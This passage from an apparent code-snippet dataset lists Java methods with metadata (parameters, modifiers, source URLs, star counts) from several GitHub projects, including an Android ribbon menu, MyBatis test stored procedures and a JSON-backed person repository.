"https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/auth/scheduler/ServTokenRefresh.java", "stars": "23", "class": {"name": "ServTokenRefresh", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "storeToken", "params": ["String", "String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void storeToken(String token, String storePath){        File storeFile = new File(storePath);        if(storeFile.getParentFile().exists() || storeFile.getParentFile().mkdirs()) {            try (BufferedWriter writer = new BufferedWriter(new                    OutputStreamWriter(new FileOutputStream(storeFile, false)))) {                writer.append(token);                writer.flush();            } catch (IOException e) {                LOG.info(\"Store Token into File error, Exception:{}\", e.getMessage());            }        }    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/common/src/main/java/com/webank/wedatasphere/exchangis/common/auth/scheduler/ServTokenRefresh.java", "stars": "23", "class": {"name": "ServTokenRefresh", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "toClassForName", "params": ["String"], "throws": ["ClassNotFoundException"], "modifiers": ["protected"], "return_type": "Class", "snippet": "  protected Class toClassForName(String className) throws ClassNotFoundException {    return Resources.classForName(className);  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/scripting/xmltags/OgnlClassResolver.java", "stars": "15", "class": {"name": "OgnlClassResolver", "extends": "DefaultClassResolver", "implements": null, "modifiers": ["public"]}}, {"method_name": "scanFileContents", "params": ["File"], "throws": ["FileNotFoundException"], "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String scanFileContents( File file ) throws FileNotFoundException    {        String content = \"\";        Scanner forParkour = new Scanner( file );        while ( forParkour.hasNextLine( ) )        {            content += forParkour.nextLine( );            content += \"\\n\";        }        String fileContents = content;        return fileContents;    }", "url": "https://raw.githubusercontent.com/Kelvidore/MCChickenNamer/master/src/main/java/pw/theo/chicken/NameScanner.java", "stars": "2", "class": {"name": "NameScanner", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "arrayThatBitch", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String[] arrayThatBitch(String s){        return s.split(\"\\n\");    }", "url": "https://raw.githubusercontent.com/Kelvidore/MCChickenNamer/master/src/main/java/pw/theo/chicken/NameScanner.java", "stars": "2", "class": {"name": "NameScanner", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "selectTwoSetsOfTwoAuthors", "params": ["int", "int", "ResultSet", "ResultSet"], "throws": ["SQLException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void selectTwoSetsOfTwoAuthors(int p1, int p2, ResultSet[] rs1, ResultSet[] rs2) throws SQLException {    try (Connection conn = DriverManager.getConnection(\"jdbc:default:connection\")) {      PreparedStatement ps1 = conn.prepareStatement(\"select * from author where id in (?,?)\");      ps1.setInt(1, p1);      ps1.setInt(2, p2);      rs1[0] = ps1.executeQuery();      PreparedStatement ps2 = conn.prepareStatement(\"select * from author where id in (?,?)\");      ps2.setInt(1, p2);      ps2.setInt(2, p1);      rs2[0] = ps2.executeQuery();    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/databases/blog/StoredProcedures.java", "stars": "15", "class": {"name": "StoredProcedures", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "insertAuthor", "params": ["int", "String", "String", "String"], "throws": ["SQLException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void insertAuthor(int id, String username, String password, String email) throws SQLException {    try (Connection conn = DriverManager.getConnection(\"jdbc:default:connection\")) {      PreparedStatement ps = conn.prepareStatement(\"INSERT INTO author (id, username, password, email) VALUES (?,?,?,?)\");      ps.setInt(1, id);      ps.setString(2, username);      ps.setString(3, password);      ps.setString(4, email);      ps.executeUpdate();    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/databases/blog/StoredProcedures.java", "stars": "15", "class": {"name": "StoredProcedures", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "selectAuthorViaOutParams", "params": ["int", "String", "String", "String", "String"], "throws": ["SQLException"], "modifiers": ["public", "static"], "return_type": "void", "snippet": "  public static void selectAuthorViaOutParams(int id, String[] username, String[] password, String[] email, String[] bio) throws SQLException {    try (Connection conn = DriverManager.getConnection(\"jdbc:default:connection\")) {      PreparedStatement ps = conn.prepareStatement(\"select * from author where id = ?\");      ps.setInt(1, id);      ResultSet rs = ps.executeQuery();      rs.next();      username[0] = rs.getString(\"username\");      password[0] = rs.getString(\"password\");      email[0] = rs.getString(\"email\");      bio[0] = rs.getString(\"bio\");    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/databases/blog/StoredProcedures.java", "stars": "15", "class": {"name": "StoredProcedures", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "load", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void load(){\t\t\t\tif(isInEditMode()) return;\t\t\t\t\t\tinflateLayout();\t\t\t\t\t\tinitUi();\t\t\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "inflateLayout", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void inflateLayout(){\t\t\t\t\t\t\t\t\t\ttry{\t\t\tLayoutInflater.from(getContext()).inflate(R.layout.rbm_menu, this, true);\t\t\t} catch(Exception e){\t\t\t\t\t\t\t}\t\t\t\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "initUi", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void initUi(){\t\t\t\trbmListView = (ListView) findViewById(R.id.rbm_listview);\t\trbmOutsideView = (View) findViewById(R.id.rbm_outside_view);\t\t\t\t\t\trbmOutsideView.setOnClickListener(new OnClickListener() {\t\t\t\t\t\t@Override\t\t\tpublic void onClick(View v) {\t\t\t\thideMenu();\t\t\t\t\t\t\t}\t\t});\t\t\t\t\t\trbmListView.setOnItemClickListener(new OnItemClickListener() {\t\t\t@Override\t\t\tpublic void onItemClick(AdapterView<?> parent, View view,\t\t\t\t\tint position, long id) {\t\t\t\t\t\t\t\tif(callback != null)\t\t\t\t\t\t\t\t\t\tcallback.RibbonMenuItemClick(menuItems.get(position).id);\t\t\t\t\t\t\t\thideMenu();\t\t\t}\t\t\t\t\t});\t\t\t\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "setMenuClickCallback", "params": ["iRibbonMenuCallback"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setMenuClickCallback(iRibbonMenuCallback callback){\t\tthis.callback = callback;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "setMenuItems", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setMenuItems(int menu){\t\t\t\tparseXml(menu);\t\t\t\tif(menuItems != null && menuItems.size() > 0)\t\t{\t\t\trbmListView.setAdapter(new Adapter());\t\t\t\t\t}\t\t\t\t\t\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "setBackgroundResource", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setBackgroundResource(int resource){\t\trbmListView.setBackgroundResource(resource);\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "showMenu", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void showMenu(){\t\trbmOutsideView.setVisibility(View.VISIBLE);\t\t\t\t\t\t\trbmListView.setVisibility(View.VISIBLE);\t\t\trbmListView.startAnimation(AnimationUtils.loadAnimation(getContext(), R.anim.rbm_in_from_left));\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "hideMenu", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void hideMenu(){\t\t\t\trbmOutsideView.setVisibility(View.GONE);\t\trbmListView.setVisibility(View.GONE);\t\t\t\t\trbmListView.startAnimation(AnimationUtils.loadAnimation(getContext(), R.anim.rbm_out_to_left));\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "toggleMenu", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void toggleMenu(){\t\t\t\tif(rbmOutsideView.getVisibility() == View.GONE){\t\t\tshowMenu();\t\t} else {\t\t\thideMenu();\t\t}\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "parseXml", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "\tprivate void parseXml(int menu){\t\t\t\tmenuItems = new ArrayList<RibbonMenuView.RibbonMenuItem>();\t\t\t\t\t\ttry{\t\t\tXmlResourceParser xpp = getResources().getXml(menu);\t\t\t\t\t\txpp.next();\t\t\tint eventType = xpp.getEventType();\t\t\t\t\t\t\t\t\twhile(eventType != XmlPullParser.END_DOCUMENT){\t\t\t\t\t\t\t\tif(eventType == XmlPullParser.START_TAG){\t\t\t\t\t\t\t\t\t\tString elemName = xpp.getName();\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tif(elemName.equals(\"item\")){\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tString textId = xpp.getAttributeValue(\"http://schemas.android.com/apk/res/android\", \"title\");\t\t\t\t\t\tString iconId = xpp.getAttributeValue(\"http://schemas.android.com/apk/res/android\", \"icon\");\t\t\t\t\t\tString resId = xpp.getAttributeValue(\"http://schemas.android.com/apk/res/android\", \"id\");\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\tRibbonMenuItem item = new RibbonMenuItem();\t\t\t\t\t\titem.id = Integer.valueOf(resId.replace(\"@\", \"\"));\t\t\t\t\t\titem.text = resourceIdToString(textId);\t\t\t\t\t\titem.icon = Integer.valueOf(iconId.replace(\"@\", \"\"));\t\t\t\t\t\t\t\t\t\t\t\tmenuItems.add(item);\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\teventType = xpp.next();\t\t\t\t\t\t\t\t\t\t\t}\t\t\t\t\t\t\t\t} catch(Exception e){\t\t\te.printStackTrace();\t\t}\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "resourceIdToString", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "String", "snippet": "\tprivate String resourceIdToString(String text){\t\t\t\tif(!text.contains(\"@\")){\t\t\treturn text;\t\t} else {\t\t\t\t\t\t\t\t\t\t\t\tString id = text.replace(\"@\", \"\");\t\t\t\t\t\t\t\t\t\t\t\treturn getResources().getString(Integer.valueOf(id));\t\t\t\t\t}\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "isMenuVisible", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isMenuVisible(){\t\t\t\treturn rbmOutsideView.getVisibility() == View.VISIBLE;\t\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "onRestoreInstanceState", "params": ["Parcelable"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "\tprotected void onRestoreInstanceState(Parcelable state)\t{\t    SavedState ss = (SavedState)state;\t    super.onRestoreInstanceState(ss.getSuperState());\t    if (ss.bShowMenu)\t        showMenu();\t    else\t        hideMenu();\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "onSaveInstanceState", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Parcelable", "snippet": "\tprotected Parcelable onSaveInstanceState()\t{\t    Parcelable superState = super.onSaveInstanceState();\t    SavedState ss = new SavedState(superState);\t    ss.bShowMenu = isMenuVisible();\t    return ss;\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "RibbonMenuView", "extends": "LinearLayout", "implements": null, "modifiers": ["public"]}}, {"method_name": "writeToParcel", "params": ["Parcel", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t    public void writeToParcel(Parcel out, int flags) {\t        super.writeToParcel(out, flags);\t        out.writeInt(bShowMenu ? 1 : 0);\t    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "SavedState", "extends": "BaseSavedState", "implements": null, "modifiers": ["static"]}}, {"method_name": "getCount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\t\tpublic int getCount() {\t\t\t\t\t\treturn menuItems.size();\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "Adapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["private"]}}, {"method_name": "getItem", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Object", "snippet": "\t\tpublic Object getItem(int position) {\t\t\t\t\t\treturn null;\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "Adapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["private"]}}, {"method_name": "getItemId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "\t\tpublic long getItemId(int position) {\t\t\t\t\t\treturn 0;\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "Adapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["private"]}}, {"method_name": "getView", "params": ["int", "View", "ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "\t\tpublic View getView(int position, View convertView, ViewGroup parent) {\t\t\t\t\t\tfinal ViewHolder holder;\t\t\t\t\t\tif(convertView == null || convertView instanceof TextView){\t\t\t\tconvertView = inflater.inflate(R.layout.rbm_item, null);\t\t\t\t\t\t\t\tholder = new ViewHolder();\t\t\t\tholder.image = (ImageView) convertView.findViewById(R.id.rbm_item_icon);\t\t\t\tholder.text = (TextView) convertView.findViewById(R.id.rbm_item_text);\t\t\t\t\t\t\t\t\t\tconvertView.setTag(holder);\t\t\t\t\t\t} else {\t\t\t\t\t\t\tholder = (ViewHolder) convertView.getTag();\t\t\t}\t\t\t\t\t\tholder.image.setImageResource(menuItems.get(position).icon);\t\t\tholder.text.setText(menuItems.get(position).text);\t\t\t\t\t\t\t\t\treturn convertView;\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/ribbonsample/src/com/darvds/ribbonmenu/sample/RibbonMenuView.java", "stars": "74", "class": {"name": "Adapter", "extends": "BaseAdapter", "implements": null, "modifiers": ["private"]}}, {"method_name": "dispatchTouchEvent", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean dispatchTouchEvent (android.view.MotionEvent p0)\t{\t\treturn n_dispatchTouchEvent (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PlatformRenderer.java", "stars": "2", "class": {"name": "PlatformRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_dispatchTouchEvent", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "boolean", "snippet": "\tprivate native boolean n_dispatchTouchEvent (android.view.MotionEvent p0);\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\t{\t\tn_onLayout (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PlatformRenderer.java", "stars": "2", "class": {"name": "PlatformRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onLayout (boolean p0, int p1, int p2, int p3, int p4)\t{\t\tn_onLayout (p0, p1, p2, p3, p4);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PlatformRenderer.java", "stars": "2", "class": {"name": "PlatformRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onLayout", "params": ["boolean", "int", "int", "int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onLayout (boolean p0, int p1, int p2, int p3, int p4);\tpublic void onMeasure (int p0, int p1)\t{\t\tn_onMeasure (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PlatformRenderer.java", "stars": "2", "class": {"name": "PlatformRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "onMeasure", "params": ["int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onMeasure (int p0, int p1)\t{\t\tn_onMeasure (p0, p1);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PlatformRenderer.java", "stars": "2", "class": {"name": "PlatformRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "n_onMeasure", "params": ["int", "int"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onMeasure (int p0, int p1);\tprivate java.util.ArrayList refList;\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PlatformRenderer.java", "stars": "2", "class": {"name": "PlatformRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PlatformRenderer.java", "stars": "2", "class": {"name": "PlatformRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/PlatformRenderer.java", "stars": "2", "class": {"name": "PlatformRenderer", "extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "List", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ArrayList<Infrastructure>", "snippet": "    public ArrayList<Infrastructure.Person> List() {        return Read();    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Add", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Add(String firstName, String lastName) {        Infrastructure.Person person = new Infrastructure.Person();        person.firstName = firstName;        person.lastName = lastName;        Add(person);    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Add", "params": ["Infrastructure"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Add(Infrastructure.Person value) {        ArrayList<Infrastructure.Person> models = Read();        int currentId = 0;        if (models.size() > 0) {            currentId = models.get(0).id;        }        value.id = ++currentId;        models.add(0, value);        Save(models);    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Update", "params": ["int", "String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Update(int id, String firstName, String lastName) {        int index = FindIndexById(id);        Infrastructure.Person person = FindById(id);        person.firstName = firstName;        person.lastName = lastName;        ArrayList<Infrastructure.Person> models = Read();        models.set(index, person);        Save(models);    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "FindById", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "Infrastructure", "snippet": "    public Infrastructure.Person FindById(int id) {        return Read().get(FindIndexById(id));    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Remove", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void Remove(int id) {        ArrayList<Infrastructure.Person> models = Read();        models.remove(FindIndexById(id));        Save(models);    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "FindIndexById", "params": ["int"], "throws": null, "modifiers": ["private"], "return_type": "int", "snippet": "    private int FindIndexById(int id) {        ArrayList<Infrastructure.Person> models = Read();        for (int i = models.size() - 1; i >= 0; i--) {            if (models.get(i).id == id)                return i;        }        return -1;    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Read", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ArrayList<Infrastructure>", "snippet": "    private ArrayList<Infrastructure.Person> Read() {        try {            File file = new File(_fileName);            file.createNewFile();            Scanner myReader = new Scanner(file);            String data = \"\";            while (myReader.hasNextLine()) {                data += myReader.nextLine();            }            myReader.close();            if (data == null || data.isBlank()) {                return new ArrayList<>();            }            return _gson.fromJson(data, new TypeToken<ArrayList<Infrastructure.Person>>() {            }.getType());        } catch (Exception e) {            e.printStackTrace();        }        return null;    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "Save", "params": ["ArrayList<Infrastructure>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void Save(ArrayList<Infrastructure.Person> value) {        try {            FileWriter myWriter = new FileWriter(_fileName);            myWriter.write(_gson.toJson(value));            myWriter.close();        } catch (Exception e) {            System.out.println(\"An error occurred.\");            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/emrecengel/FridayClasses/master/src/Infrastructure/Repositories/JsonPersonRepository.java", "stars": "2", "class": {"name": "JsonPersonRepository", "extends": null, "implements": ["Infrastructure"], "modifiers": []}}, {"method_name": "init", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void init() {        try {            monitorService.updateNginxFromNacos();        } catch (Exception e) {        }    }", "url": "https://raw.githubusercontent.com/cyl2cyl/nginx_service_discovery/master/src/main/java/com/xm/service/discovery/AppStartup.java", "stars": "3", "class": {"name": "AppStartup", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "test", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void test() {        System.out.println(\"\u4e24\u4e2a\u5c0f\u65f6\u8fc7\u53bb\u4e86\u554a\");    }", "url": "https://raw.githubusercontent.com/wanzicong/mybatis-study/master/src/main/java/com/mybatis/schedule/Schedule.java", "stars": "1", "class": {"name": "Schedule", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "one", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String one() {\t\treturn \"one\";\t}", "url": "https://raw.githubusercontent.com/spring-projects/spring-boot/master/spring-boot-project/spring-boot-devtools/src/intTest/java/com/example/ControllerOne.java", "stars": "47572", "class": {"name": "ControllerOne", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "sizeOf", "params": ["Bitmap"], "throws": null, "modifiers": ["static"], "return_type": "long", "snippet": "    static long sizeOf(Bitmap b) {        return b.getWidth() * b.getHeight() * BYTES_PER_PIXEL;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "sizeOf", "params": ["Iterable<Bitmap>"], "throws": null, "modifiers": ["private", "static"], "return_type": "long", "snippet": "    private static long sizeOf(Iterable<Bitmap> bitmaps) {        long total = 0;        for (Bitmap bitmap : bitmaps) {            total += sizeOf(bitmap);        }        return total;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "removeEldestEntry", "params": ["java"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean removeEldestEntry(java.util.Map.Entry<K, Bitmap> eldest) {        return mRemove;    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/google%20image%20loader%20api%20complete/com/google/android/imageloader/BitmapCache.java", "stars": "74", "class": {"name": "BitmapCache", "extends": "LinkedHashMap", "implements": null, "modifiers": []}}, {"method_name": "trimEldest", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void trimEldest() {        // Remove null otherwise put() may have no effect        super.remove(null);        // Induce LinkedHashMap to remove the eldest element        mRemove = true;        try {            super.put(null, null);        } finally {            